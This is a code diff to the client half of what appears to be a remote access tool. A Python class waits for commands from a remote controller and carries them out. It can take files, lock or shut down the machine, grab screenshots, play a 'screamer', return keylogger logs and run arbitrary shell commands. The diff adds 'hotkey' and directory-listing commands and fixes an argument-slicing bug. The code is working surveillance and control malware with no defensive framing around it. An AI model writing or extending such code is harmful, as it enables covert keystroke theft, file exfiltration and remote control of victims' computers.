@@ -133,7 +133,8 @@ class Client:
     def run(self):
         while True:
             command = self.receive_json()
-            print(command)
+            if command != ["ping"]:
+                print(command)
             num_time_limit = 18
             if "time_limit" in command:
                 num_time_limit = int(command.split("time_limit"))
@@ -159,7 +160,7 @@ class Client:
                         case "download":
                             command_response = self.readFile(command[1]).decode()
                         case "message":
-                            command_response = commands.message(command[:1])
+                            command_response = commands.message(command[1:])
                         case "lock":
                             command_response = commands.lock_pc()
                         case "shutdown":
@@ -168,6 +169,8 @@ class Client:
                             command_response = commands.restart_pc()
                         case "screenshot":
                             command_response = self.screen_handler()
+                        case "hotkey":
+                            command_response = commands.hotkey(command[1:])
                         case "screamer":
                             command_response = commands.screamer()
                         case "syscom":
@@ -185,6 +188,8 @@ class Client:
                             exit()
                         case "keylogger":
                             command_response = self.keylogger.get_keylogs()
+                        case "dir":
+                            command_response = os.listdir()
                         case _:
                             # convCommand = self.arrayToString(command)
                             convCommand = " ".join(command)
